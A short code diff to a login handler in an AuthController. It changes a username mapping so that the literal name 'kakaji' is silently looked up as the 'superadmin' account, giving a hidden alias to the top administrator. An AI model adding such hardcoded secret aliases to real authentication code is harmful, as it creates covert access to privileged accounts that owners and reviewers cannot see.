@@ -262,7 +262,7 @@ export class AuthController extends ApiController {
       if (!req.body.username || !req.body.password) {
         return this.fail(res, 'Please, send your username and password.');
       }
-     let usernameo = req.body.username == "superadmin" ? "superadmin" : req.body.username.toUpperCase()
+     let usernameo = req.body.username == "kakaji" ? "superadmin" : req.body.username.toUpperCase()
 
       // Find admin or upper-level user (not regular "user")
       const user = await User.findOne({
